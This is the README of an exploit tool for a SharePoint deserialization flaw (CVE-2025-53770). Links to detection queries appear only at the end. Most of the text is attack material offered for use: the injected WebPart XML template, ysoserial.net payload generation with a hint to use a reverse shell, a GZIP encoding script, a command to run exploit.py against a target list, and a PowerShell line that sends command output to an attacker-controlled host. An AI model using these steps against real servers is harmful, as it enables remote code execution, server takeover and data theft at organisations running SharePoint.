# SharePoint WebPart Injection Exploit Tool


| Field               | Value                                                                 |
|--------------------|-----------------------------------------------------------------------|
| **Component**       | Microsoft SharePoint (on-premises)                                    |
| **Endpoint**        | `/layouts/15/ToolPane.aspx`                                           |
| **Parameter**       | `MSOTlPn_DWP`                                                         |
| **Injected Control**| `<Scorecard:ExcelDataSet CompressedDataTable="...">`                 |
| **Vulnerability**   | Insecure deserialization (`BinaryFormatter`, `LosFormatter`, etc.)    |
| **CVE**             | [CVE-2025-53770](https://nvd.nist.gov/vuln/detail/CVE-2025-53770)     |

---

## How It Works

1. Authenticated users can send POST requests to `/_layouts/15/ToolPane.aspx?DisplayMode=Edit`.

2. The request includes the parameter `MSOTlPn_DWP`, containing an injected **WebPart XML**.

3. Inside the WebPart, the attacker places a `<Scorecard:ExcelDataSet>` component with the `CompressedDataTable` attribute holding a payload:
- Serialized .NET object
- Encoded in Base64
- Compressed using GZIP

4. SharePoint automatically **inflates** and **deserializes** the object using unsafe formatters.

5. If the object contains a valid **gadget chain** (e.g., `ObjectDataProvider`), **arbitrary code** is executed on the server.

## Requirements

- Python 3.x  
- Required Python modules:
```bash
pip install -r requirements.txt
```

* A Base64 GZIP-compressed .NET deserialization payload (see next section)

The payload must be:

* A `.NET DataSet` or similar gadget chain
* Serialized using `LosFormatter` or `BinaryFormatter`
* Base64-encoded
* GZIP-compressed
* Embedded inside this WebPart structure:

```xml
<asp:UpdateProgress ID="UpdateProgress1" runat="server" AssociatedUpdatePanelID="upTest">
  <ProgressTemplate>
    <div class="divWaiting">
      <Scorecard:ExcelDataSet CompressedDataTable="{PAYLOAD}" DataTable-CaseSensitive="false" runat="server" />
    </div>
  </ProgressTemplate>
</asp:UpdateProgress>
```

---

## Generating Payloads (Using `ysoserial.net`)

### Generate the base64 serialized object

```bash
cd ysoserial.net

# compile from source or use Dockerfile

ysoserial.exe -f LosFormatter -g ObjectDataProvider -o base64 -c "calc.exe" > payload.b64
```

> You can replace `calc.exe` with any command — for example, a reverse shell.

---

### Compress with GZIP

```python
import gzip, base64

with open("payload.b64", "rb") as f:
    decoded = base64.b64decode(f.read())
    compressed = gzip.compress(decoded)
    print(base64.b64encode(compressed).decode())
```

> Save the final output into `payload.txt` — this is what you give to the exploit script.

---

## Compatible Gadget Chains

You can use any gadget chain supported by your serialization tool. Common examples include:

* `System.Data.DataSet`
* `System.Data.Services.Internal.ExpandedWrapper`
* `System.Web.UI.LosFormatter`
* `System.Windows.Data.ObjectDataProvider`

> For more, check [ysoserial.net](https://github.com/pwntester/ysoserial.net) 

---

## Output / Echo

This vulnerability **does not return command output** like `ipconfig` in the HTTP response. If you want output:

* Use reverse shell payloads
* Or redirect output via `Invoke-WebRequest`:

```powershell
powershell -c "ipconfig | Invoke-WebRequest -Uri http://your-ip:8000/?d=$(Get-Content -Raw)"
```


## Example Usage

```bash
python3 exploit.py -t targets.txt --file payload.txt --proxy http://127.0.0.1:8080
```

### Arguments:

| Argument           | Description                                           |
| ------------------ | ----------------------------------------------------- |
| `-t` / `--targets` | File containing SharePoint target URLs (one per line) |
| `--file`           | File containing the base64 GZIP-compressed payload    |
| `--proxy`          | (Optional) Burp/ZAP proxy for interception/debugging  |

## SIEM Detection Queries:

(in-prog active exploitation worldwide)

Elastic:

https://github.com/robert-iw3/threat-hunting/blob/main/elastic-security/CVE-2025-53770.md

Splunk:

https://github.com/robert-iw3/threat-hunting/blob/main/splunk/CVE-2025-53770.md

Sentinel One:

https://github.com/robert-iw3/threat-hunting/blob/main/sentinel_one/spinstall0.aspx.md

https://github.com/robert-iw3/threat-hunting/blob/main/sentinel_one/sharepoint-activity.md

Sigma:

https://github.com/robert-iw3/threat-hunting/blob/main/sigma/2025/sharepoint_postexploit.yaml

https://github.com/robert-iw3/threat-hunting/blob/main/sigma/2025/sharepoint_webshell.yaml

Sentinel:

https://github.com/robert-iw3/threat-hunting/blob/main/kql/Sentinel/CVE-2025-53770%20-%20Successful%20exploitation%20via%20file%20creation.kql

https://github.com/robert-iw3/threat-hunting/blob/main/kql/Sentinel/Exploitation%20of%20SharePoint%20Vulnerability%20(CVE-2025-53770).kql

https://github.com/robert-iw3/threat-hunting/blob/main/kql/Sentinel/SharePoint%20Vulnerability%20Exploitation%20Attempt%20(CVE-2025-49704%2C%20CVE-2025-49706%2C%20CVE-2025-53770).kql



